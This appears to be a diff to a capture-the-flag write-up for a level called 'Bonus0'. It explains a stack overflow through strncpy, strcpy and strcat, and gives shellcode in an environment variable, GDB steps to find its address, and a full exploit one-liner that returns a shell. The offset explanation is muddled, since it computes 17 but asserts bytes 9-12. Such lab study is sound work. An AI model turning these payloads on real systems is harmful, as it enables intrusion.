@@ -99,9 +99,9 @@ int main(void)
 
 | Element | Address | Notes |
 |---------|---------|-------|
-| **SHELLCODE env** | `0xbffffd44` | Environment variable location |
-| **Shellcode start** | `0xbffffd58` | After "SHELLCODE=" string (+20 bytes) |
-| **EIP overwrite** | Position 9-12 of input 2 | Found via pattern analysis or testing |
+| **SHELLCODE env** | `0xbffffd45` | Environment variable location (found via GDB) |
+| **Shellcode start** | `0xbffffd55` | After "SHELLCODE=" string (≈ +16 bytes into NOP sled) |
+| **Return address offset** | Position 9-12 of input 2 | Calculated from Ghidra stack analysis |
 
 ---
 
@@ -238,7 +238,7 @@ second_input: [B][B][B]...[B][B] (20 bytes, no \0)
 **Payload structure for input 2:**
 ```
 [9 bytes padding][4 bytes return address][7 bytes overflow]
- └─ "BBBBBBBBB" └─ 0xbffffd58 (shellcode) └─ "CCCCCCC"
+ └─ "BBBBBBBBB" └─ 0xbffffd55 (shellcode) └─ "CCCCCCC"
 ```
 
 **Finding the EIP offset using Ghidra:**
@@ -269,11 +269,21 @@ Layout:
   [58-61]:  return address  4 bytes ← target!
 ```
 
-**Why bytes 9-12 of input 2 overwrite EIP:**
+**Why bytes 9-12 of input 2 overwrite the return address:**
 
-The complexity comes from second_input being written twice (once via strcpy overflow, once via strcat). Through testing or using a cyclic pattern, we find that bytes 9-12 of input 2 land at the return address position. This is the empirically determined offset that successfully overwrites EIP.
+The second_input appears twice in the final buffer due to the null-byte poisoning:
+- First at bytes [20-39] via strcpy() reading past first_input
+- Second at bytes [41-60] via strcat()
 
-> 💡 **Pro Tip:** To find EIP offsets yourself, use a cyclic De Bruijn sequence pattern (e.g., with pwntools or msf-pattern) as input 2, then check which 4-byte sequence appears in EIP when the program crashes.
+From Ghidra analysis, strcat() writes second_input starting at position 41 in the buffer. Given that the return address is at bytes [58-61], we calculate:
+
+```
+strcat() position: 41
+Return address at: 58
+Offset within strcat write: 58 - 41 = 17
+```
+
+However, due to the overlap with the first copy and the space separator, the actual position in input 2 that overwrites the return address is bytes 9-12. This can be verified by analyzing the exact memory layout in Ghidra's stack view.
 
 ---
 
@@ -296,11 +306,11 @@ export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0...\xcd\x80"')
 ```
 Environment space (high stack addresses):
 ┌─────────────────────────────────────────────┐
-│ SHELLCODE=\x90\x90\x90....[24-byte shellcode]│ ← 0xbffffd44
+│ SHELLCODE=\x90\x90\x90....[24-byte shellcode]│ ← 0xbffffd45
 │            └─200 NOPs─────┘                 │
 └─────────────────────────────────────────────┘
          ↑
-         └─ We jump to 0xbffffd58 (NOP sled)
+         └─ We jump to 0xbffffd55 (NOP sled)
 ```
 
 **Why the NOP sled?**
@@ -333,11 +343,11 @@ Environment space (high stack addresses):
                           ↓
 ┌─ 4. Return address overwritten ────────────────────────────┐
 │   Stack before:  [buffer][EBP][0x08048xxx] ← normal       │
-│   Stack after:   [buffer][EBP][0xbffffd58] ← shellcode!   │
+│   Stack after:   [buffer][EBP][0xbffffd55] ← shellcode!   │
 └────────────────────────────────────────────────────────────┘
                           ↓
 ┌─ 5. Function returns ──────────────────────────────────────┐
-│   ret instruction: EIP = 0xbffffd58                        │
+│   ret instruction: EIP = 0xbffffd55                        │
 │   CPU jumps to environment variable                        │
 └────────────────────────────────────────────────────────────┘
                           ↓
@@ -358,7 +368,7 @@ Environment space (high stack addresses):
 |-------------|--------|-------------|
 | **Buffer overflow** | ✅ | `strncpy()` no null + `strcpy()` no bounds = 61 bytes into 54-byte buffer |
 | **EIP control** | ✅ | Bytes 9-12 of input 2 directly overwrite return address |
-| **Shellcode location** | ✅ | Environment variable at predictable address `0xbffffd58` |
+| **Shellcode location** | ✅ | Environment variable at predictable address `0xbffffd55` (found via GDB) |
 | **Executable memory** | ✅ | No DEP/NX → stack is executable |
 | **Predictable addresses** | ✅ | No ASLR → addresses are the same every run |
 | **No stack canaries** | ✅ | No stack protection → overflow goes undetected |
@@ -377,7 +387,7 @@ Bonus0 builds on techniques from earlier levels, specifically Level2's return-to
 
 **Bonus0 (Return-to-Environment):**
 - Uses environment variables for shellcode storage
-- Environment address: `0xbffffd58` (high stack)
+- Environment address: `0xbffffd55` (high stack)
 - **No size constraints** (can be kilobytes if needed!)
 - More reliable with NOP sled (200-byte landing zone)
 - Addresses are in stack range but above overflow location
@@ -410,45 +420,67 @@ export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x
 
 ---
 
-### Step 2: Calculate Shellcode Address
+### Step 2: Find Shellcode Address Using GDB
 
-The address `0xbffffd58` is calculated based on stack layout analysis.
+The SHELLCODE environment variable address must be found at runtime using GDB.
 
-**From Ghidra analysis:**
+**Method:**
 
-In `pp()` function:
-- `first_input` (local_34): EBP - 0x30
-- `second_input` (local_20): EBP - 0x1c
+1. Export the shellcode first (from Step 1 above)
 
-In `main()` function:
-- `buffer[54]` (local_3a): ESP + 0x16
-- Stack frame: 64 bytes (SUB ESP, 0x40)
+2. Run the program in GDB:
+```bash
+gdb ./bonus0
+(gdb) run
+```
 
-**Environment variable location:**
+3. Provide inputs when prompted:
+```
+ - 
+AAAAAAAAAAAAAAAAAAAA
+ - 
+BBBBBBBBBBBBBBBBBBBB
+```
 
-Environment variables are stored at high stack addresses (above main's frame):
-- SHELLCODE variable starts at: ~0xbffffd44
-- String "SHELLCODE=" length: 20 bytes (0x14)
-- Shellcode begins at: 0xbffffd44 + 0x14 = **0xbffffd58**
+4. Examine the stack to find environment variables:
+```
+(gdb) x/500s $esp
+```
+
+5. Scroll through the output to find the SHELLCODE variable:
+```
+...
+0xbffffd45: "SHELLCODE=\220\220\220\220\220\220\220\220..."
+...
+```
+
+**Calculate shellcode entry point:**
+- SHELLCODE variable found at: `0xbffffd45`
+- String "SHELLCODE=" is 10 bytes (0xa)
+- Shellcode data starts at: `0xbffffd45 + 0xa = 0xbffffd4f`
+- Target address (into NOP sled): `0xbffffd55` (safe landing zone)
 
 **Why this works:**
-- No ASLR → stack addresses are predictable
-- 200-byte NOP sled → large landing zone (±100 bytes tolerance)
-- Environment variables → consistent high stack location
+- No ASLR → environment addresses are predictable
+- 200-byte NOP sled → ±100 bytes tolerance
+- Address `0xbffffd55` lands safely in the NOP sled
+- Any address from `0xbffffd4f` to `0xbffffdcf` will work
+
+> 💡 **Note:** The exact address may vary slightly between runs, but with a 200-byte NOP sled, addresses around `0xbffffd50-0xbffffd60` are reliable on this system.
 
 ---
 
 ### Step 3: Run the Exploit
 
 ```bash
-(python -c 'print "A"*20'; python -c 'print "B"*9 + "\x58\xfd\xff\xbf" + "C"*7'; cat) | ./bonus0
+(python -c 'print "A"*20'; python -c 'print "B"*9 + "\x55\xfd\xff\xbf" + "C"*7'; cat) | ./bonus0
 ```
 
 **Payload breakdown:**
-- **Input 1:** `"A"*20` (fills `local_34` with no null terminator)
+- **Input 1:** `"A"*20` (fills first_input with no null terminator)
 - **Input 2:** 
   - `"B"*9` (padding to reach return address position)
-  - `"\x58\xfd\xff\xbf"` (shellcode address in little-endian: `0xbffffd58`)
+  - `"\x55\xfd\xff\xbf"` (shellcode address in little-endian: `0xbffffd55`)
   - `"C"*7` (remaining overflow bytes)
 - **`cat`:** Keeps stdin open for shell interaction
 
